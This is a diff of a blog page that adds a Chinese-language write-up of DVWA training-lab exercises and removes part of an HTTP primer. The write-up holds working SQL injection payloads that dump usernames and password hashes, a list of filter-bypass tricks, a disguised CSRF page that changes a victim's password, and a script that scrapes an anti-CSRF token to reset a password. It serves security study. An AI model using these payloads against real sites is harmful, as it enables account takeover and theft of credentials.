@@ -76,6 +76,169 @@
     
     
     
+    <article id="post-DVWA" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2020/04/02/DVWA/"
+    >DVWA</a
+  >
+</h2>
+  
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2020/04/02/DVWA/" class="article-date">
+  <time datetime="2020-04-02T06:36:59.000Z" itemprop="datePublished">2020-04-02</time>
+</a>
+      
+      
+      
+      
+    </div>
+    
+
+    
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+      <h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a><strong>SQL Injection</strong></h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a><strong>low</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,table_name from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39;#</span><br><span class="line">&#x2F;&#x2F;输出如下</span><br><span class="line">ID: 1&#39; union select 1,table_name from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39;#</span><br><span class="line">First name: 1</span><br><span class="line">Surname: guestbook</span><br><span class="line">ID: 1&#39; union select 1,table_name from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39;#</span><br><span class="line">First name: 1</span><br><span class="line">Surname: users</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;爆users的列</span><br><span class="line">1&#39; union select 1,column_name from information_schema.columns where table_name&#x3D;&#39;users&#39;#</span><br><span class="line">ID: 1&#39; union select 1,column_name from information_schema.columns where table_name&#x3D;&#39;users&#39;#</span><br><span class="line">First name: 1</span><br><span class="line">Surname: user</span><br><span class="line">ID: 1&#39; union select 1,column_name from information_schema.columns where table_name&#x3D;&#39;users&#39;#</span><br><span class="line">First name: 1</span><br><span class="line">Surname: password</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;爆user列和password列的字段内容</span><br><span class="line">1&#39; union select 1,concat(user,password) from users#</span><br></pre></td></tr></table></figure>
+
+<h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a><strong>medium</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//直接爆数据库名和表名                                         末尾加  &amp;&amp;Submit=Submit</span></span><br><span class="line">id=<span class="number">1</span> union select database(),table_name from information_schema.tables where table_schema=database()<span class="comment">#</span></span><br><span class="line"><span class="comment">//查询用户名和对应的密码</span></span><br><span class="line">id=<span class="number">1</span> union select concat(user),concat(password)  from users <span class="comment">##&amp;&amp;Submit=Submit</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="high"><a href="#high" class="headerlink" title="high"></a><strong>high</strong></h3><p>不是很懂这里后面加了limit1 有什么用，注释掉就好了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID: id=<span class="number">1</span><span class="string">'  union select concat(user),concat(password)  from users #</span></span><br><span class="line"><span class="string">First name: admin</span></span><br><span class="line"><span class="string">Surname: 5f4dcc3b5aa765d61d8327deb882cf99</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a><strong>impossible</strong></h3><p>这个就很有意思了，新手很值得学习，代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( $id )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">':id'</span>, $id, PDO::PARAM_INT );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">        $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Make sure only 1 result is returned</span></span><br><span class="line">        <span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Get values</span></span><br><span class="line">            $first = $row[ <span class="string">'first_name'</span> ];</span><br><span class="line">            $last  = $row[ <span class="string">'last_name'</span> ];</span><br></pre></td></tr></table></figure>
+
+<p>引用<a href="https://blog.csdn.net/qq_45555226/article/details/102884030" target="_blank" rel="noopener">大佬</a>的一张图可以很直观的看到从low到impossible级别所加的防御机制</p>
+<img src="/2020/04/02/DVWA/1.png" style="zoom: 67%;">
+
+<p>一般来讲，<strong>is_numeric()</strong> 可以利用16进制绕过，比如 1 or 1=1  &gt;&gt;0x314f52313d31</p>
+<p>可以考虑采用<strong>正则表达式</strong>的方法来取代is_numberic函数</p>
+<p>一、如果发现一个url可能是注入点之后我们可以尝试手注，但是一般的网站都会过滤一些字符串。</p>
+<p>在^没有被过滤的时候可以利用它来测试</p>
+<p>异或：xor或^</p>
+<p>逻辑运算就是：同真异假（两个条件结果相同就为真，结果不同就为假）</p>
+<p>例如：1^0 就是 1 ，1^1 就是 0</p>
+<p>例如：?id=1’ ^ (length(‘union’)!=0)–+</p>
+<p>如果union被过滤，则后面条件的结果就是假的，前面也是假的，url返回正确</p>
+<p>如果union没有被过滤，则后面的条件的结果就是真的，而前面是假的，url返回错误</p>
+<p>也可以是?id=1’ ^ (length(‘union’)=5)–+</p>
+<p>二、简单的sql绕过</p>
+<p>基本关键字：括号、空格、引号、#、=、+、and、or、order、select、union、update、inster、into、delete、outfile……</p>
+<p>一些绕过的方法：</p>
+<p>1、 大小写混写</p>
+<p>2、 使用url编码替换字符 ‘ %27，# %23</p>
+<p>3、 十六进制绕过 where=“user” where=0x7573657273</p>
+<p>4、使用&amp;&amp; || 代替and or</p>
+<p>5、双写关键字 aandnd</p>
+<p>6、绕过空格：用tab键代替空格</p>
+<p>用回车chr(13)&amp;chr(10)，url编码的形式%0d%0a</p>
+<p>用括号 id=1(and)1=1</p>
+<p>7、=用like、rlike、等代替</p>
+<p>8、使用/<strong>/注释符来，重组关键字 un/</strong>/i/**/on</p>
+<p>9、注释负：//，– , /**/, #, –+, – -, ;,%00,–a</p>
+<p>如果是使用gbk的网页编码的网站也可以利用宽字节来绕过 </p>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</span><br></pre></td></tr></table></figure>
+
+<p> i 表示不区分大小写；<br>       “/[a-zA-Z]/“ &lt;==&gt;”/[a-z]/i”</p>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a><strong>CSRF</strong></h2><h3 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h3><p><strong>白盒测试，源码：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">    $pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new );</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">        $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>关键代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$pass_new = mysql_real_escape_string( $pass_new );</span><br><span class="line">$pass_new = md5( $pass_new );</span><br></pre></td></tr></table></figure>
+
+<p>可以看出，这里只对GET进行了防sql注入，并没防CSRF机制</p>
+<p>构造页面test.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">"http://127.0.0.1:12138/vulnerabilities/csrf/?password_new=123123chj&amp;password_conf=123123chj&amp;Change=Change#"</span> border=<span class="string">"0"</span> style=<span class="string">"display:none;"</span> /&gt;</span><br><span class="line">&lt;h1&gt;<span class="number">404</span>&lt;h1&gt;</span><br><span class="line">&lt;h2&gt;file not found&lt;h2&gt;</span><br></pre></td></tr></table></figure>
+
+<p>只要引诱别人点击此，就可成功修改其密码。</p>
+<p><strong>黑盒测试：</strong></p>
+<p><strong>抓包查看有没有token</strong></p>
+<p><strong>如果没有token，直接请求这个页面，不带refer</strong></p>
+<p><strong>如果返回的数据还是一样的话，那说明很有可能有CSRF漏洞了，这是一个黑盒的挖掘方法</strong></p>
+<p>抓包分析，发现有refer</p>
+<p>删除refer观察发现返回结果一致</p>
+<p>直接构造url，欺骗用户点击即可。</p>
+<hr>
+<h3 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a><strong>medium</strong></h3><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Checks to see where the request came from</span></span><br><span class="line">    <span class="keyword">if</span>( eregi( $_SERVER[ <span class="string">'SERVER_NAME'</span> ], $_SERVER[ <span class="string">'HTTP_REFERER'</span> ] ) ) &#123;</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        $pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">        $pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do the passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">            <span class="comment">// They do!</span></span><br><span class="line">            $pass_new = mysql_real_escape_string( $pass_new );</span><br><span class="line">            $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Update the database</span></span><br><span class="line">            $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">            $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Issue with passwords matching</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Didn't come from a trusted source</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;That request didn't look correct.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>防CSRF攻击代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eregi( $_SERVER[ <span class="string">'SERVER_NAME'</span> ], $_SERVER[ <span class="string">'HTTP_REFERER'</span> ])</span><br></pre></td></tr></table></figure>
+
+<p>解析：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eregi(string pattern, string str)：</span><br><span class="line"><span class="comment">#检查str中是否含有pattern（不区分大小写），如果有返回True，反之False。</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP超全局变量$_SERVER中的两个值：</span><br><span class="line">$_SERVER[<span class="string">'HTTP_REFERER'</span>]：PHP中获取链接到当前页面的前一页面的url链接地址，即HTTP数据包中的Referer参数的值。</span><br><span class="line">$_SERVER[<span class="string">'SERVER_NAME'</span>]：PHP中获取服务器主机的名称，即HTTP数据包中的Host参数的值。</span><br></pre></td></tr></table></figure>
+
+<p>Referer参数的值，表示来源地址</p>
+<p>Host：请求资源所在服务器</p>
+<p>这种机制下，就要求来源地址要包含服务器主机地址</p>
+<p><strong>绕过方式：</strong></p>
+<p>假设攻击服务器主机的域名的域名为：<a href="http://www.chj.com" target="_blank" rel="noopener">www.chj.com</a></p>
+<p>攻击者本机域名为：<a href="http://www.ccc.com" target="_blank" rel="noopener">www.ccc.com</a></p>
+<p>则只需要将文件名改为<a href="http://www.chj.com" target="_blank" rel="noopener">www.chj.com</a></p>
+<p>那么访问的时候refer便是<a href="http://www.ccc.com/www.chj.com" target="_blank" rel="noopener">www.ccc.com/www.chj.com</a></p>
+<p>成功包含host，即可绕过。</p>
+<p><strong>目前高版本的PHP已经放弃这个函数了，如php5.3</strong></p>
+<hr>
+<h3 id="high-1"><a href="#high-1" class="headerlink" title="high"></a><strong>high</strong></h3><p>源码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">    $pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new );</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">        $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>防护机制：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br></pre></td></tr></table></figure>
+
+<p>抓包发现，这个token是随机生成的，所以要想绕过此机制，关键是要获取token，要利用受害者的cookie去修改密码的页面获取关键的token。</p>
+<p>攻击代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">alert(document.cookie);</span><br><span class="line"><span class="keyword">var</span> theUrl = <span class="string">'http://www.dvwa.com/vulnerabilities/csrf/'</span>;</span><br><span class="line">    <span class="keyword">if</span>(window.XMLHttpRequest) &#123;</span><br><span class="line">        xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        xmlhttp = <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">var</span> count = <span class="number">0</span>;</span><br><span class="line">    xmlhttp.withCredentials = <span class="keyword">true</span>;</span><br><span class="line">    xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(xmlhttp.readyState ==<span class="number">4</span> &amp;&amp; xmlhttp.status==<span class="number">200</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> text = xmlhttp.responseText;</span><br><span class="line">            <span class="keyword">var</span> regex = /user_token\<span class="string">' value\=\'(.*?)\' \/\&gt;/;</span></span><br><span class="line"><span class="string">            var match = text.match(regex);</span></span><br><span class="line"><span class="string">            console.log(match);</span></span><br><span class="line"><span class="string">            alert(match[1]);</span></span><br><span class="line"><span class="string">                var token = match[1];</span></span><br><span class="line"><span class="string">                    var new_url = '</span>http:<span class="comment">//127.0.0.1/vulnerabilities/csrf/?user_token='+token+'&amp;password_new=test&amp;password_conf=test&amp;Change=Change';</span></span><br><span class="line">                    <span class="keyword">if</span>(count==<span class="number">0</span>)&#123;</span><br><span class="line">                        count++;</span><br><span class="line">                        xmlhttp.open(<span class="string">"GET"</span>,new_url,<span class="keyword">false</span>);</span><br><span class="line">                        xmlhttp.send();</span><br><span class="line">                    &#125;</span><br><span class="line">                    </span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    xmlhttp.open(<span class="string">"GET"</span>,theUrl,<span class="keyword">false</span>);</span><br><span class="line">    xmlhttp.send();</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+      
+      <!-- reward -->
+      
+    </div>
+    
+    
+      <!-- copyright -->
+      
+    <footer class="article-footer">
+      
+      
+
+    </footer>
+
+  </div>
+
+  
+
+  
+  
+  
+
+  
+
+</article>
+    
     <article id="post-Metasploit魔鬼训练营" class="article article-type-post" itemscope
   itemprop="blogPost" data-scroll-reveal>
 
@@ -596,86 +759,6 @@
 
       
       <hr>
-<h3 id="HTTP与HTTPS"><a href="#HTTP与HTTPS" class="headerlink" title="HTTP与HTTPS"></a>HTTP与HTTPS</h3><h4 id="1-HTTP的基本概念"><a href="#1-HTTP的基本概念" class="headerlink" title="1.HTTP的基本概念"></a><strong>1.HTTP的基本概念</strong></h4><p>HTTP：<a href="https://baike.baidu.com/item/超文本传输协议/8535513" target="_blank" rel="noopener">超文本传输协议</a>（HTTP，HyperText Transfer Protocol)是<a href="https://baike.baidu.com/item/互联网" target="_blank" rel="noopener">互联网</a>上应用最为广泛的一种<a href="https://baike.baidu.com/item/网络协议/328636" target="_blank" rel="noopener">网络协议</a>。设计Http最初的目的是为了提供一种发布和接收<a href="https://baike.baidu.com/item/HTML" target="_blank" rel="noopener">HTML</a>页面的方法。它可以使浏览器更加高效。Http协议是以明文方式发送信息的，如果黑客截取了Web浏览器和服务器之间的传输报文，就可以直接获得其中的信息。</p>
-<p><strong>HTTP原理：</strong></p>
-<p>①  客户端的浏览器首先要通过网络与服务器建立连接，该<strong>连接是通过TCP 来完成的，一般 TCP 连接的端口号是80</strong>。  建立连接后，客户机发送一个请求给服务器，请求方式的格式为：<strong>统一资源标识符（URL）、协议版本号，后边是 MIME  信息包括请求修饰符、客户机信息和许可内容。</strong></p>
-<p>② 服务器接到请求后，给予相应的响应信息，其格式为一个状态行，包括信息的协议版本号、一个成功或错误的代码，后边是 MIME 信息包括服务器信息、实体信息和可能的内容。</p>
-<h4 id="—-常见的HTTP相应状态码"><a href="#—-常见的HTTP相应状态码" class="headerlink" title="—-常见的HTTP相应状态码"></a><strong>—-常见的HTTP相应状态码</strong></h4><p>200：请求被正常处理<br>204：请求被受理但没有资源可以返回<br>206：客户端只是请求资源的一部分，服务器只对请求的部分资源执行GET方法，相应报文中通过Content-Range指定范围的资源。<br>301：永久性重定向<br>302：临时重定向<br>303：与302状态码有相似功能，只是它希望客户端在请求一个URI的时候，能通过GET方法重定向到另一个URI上<br>304：发送附带条件的请求时，条件不满足时返回，与重定向无关<br>307：临时重定向，与302类似，只是强制要求使用POST方法<br>400：请求报文语法有误，服务器无法识别<br>401：请求需要认证<br>403：请求的对应资源禁止被访问<br>404：服务器无法找到对应资源<br>500：服务器内部错误<br>503：服务器正忙</p>
-<h4 id="—-GET方法与POST方法的区别"><a href="#—-GET方法与POST方法的区别" class="headerlink" title="—-GET方法与POST方法的区别"></a>—-GET方法与POST方法的区别</h4><p>区别一：<br>get重点在从服务器上获取资源，post重点在向服务器发送数据；<br>区别二：<br>get传输数据是通过URL请求，以field（字段）= value的形式，置于URL后，并用”?”连接，<strong>多个请求数据间用”&amp;”连接</strong>，如<a href="http://127.0.0.1/Test/login.action?name=admin&amp;password=admin，这个过程用户是可见的；" target="_blank" rel="noopener">http://127.0.0.1/Test/login.action?name=admin&amp;password=admin，这个过程用户是可见的；</a><br>post传输数据通过Http的post机制，将字段与对应值封存在请求实体中发送给服务器，这个过程对用户是不可见的；<br>区别三：<br>Get传输的数据量小，因为受URL长度限制，但效率较高；<br><strong>Post可以传输大量数据，所以上传文件时只能用Post方式</strong>；<br>区别四：<br>get是不安全的，因为URL是可见的，可能会泄露私密信息，如密码等；<br>post较get安全性较高；<br>区别五：<br>get方式只能支持ASCII字符，向服务器传的中文字符可能会乱码。<br><strong>post支持标准字符集，可以正确传递中文字符</strong>。</p>
-<h4 id="—-HTTP请求报文与响应报文格式"><a href="#—-HTTP请求报文与响应报文格式" class="headerlink" title="—-HTTP请求报文与响应报文格式"></a><strong>—-HTTP请求报文与响应报文格式</strong></h4><p><strong>请求报文</strong>包含三部分：<br>a、请求行：包含<strong>请求方法、URI、HTTP版本信息</strong><br>b、请求首部字段<br>c、请求内容实体<br><strong>响应报文</strong>包含三部分：<br>a、状态行：<strong>包含HTTP版本、状态码、状态码的原因短语</strong><br>b、响应首部字段<br>c、响应内容实体</p>
-<h4 id="—-常见HTTP首部字段"><a href="#—-常见HTTP首部字段" class="headerlink" title="—-常见HTTP首部字段"></a><strong>—-常见HTTP首部字段</strong></h4><p><strong>a、通用首部字段（请求报文与响应报文都会使用的首部字段）</strong><br>Date：创建报文时间<br>Connection：连接的管理<br>Cache-Control：缓存的控制<br>Transfer-Encoding：报文主体的传输编码方式</p>
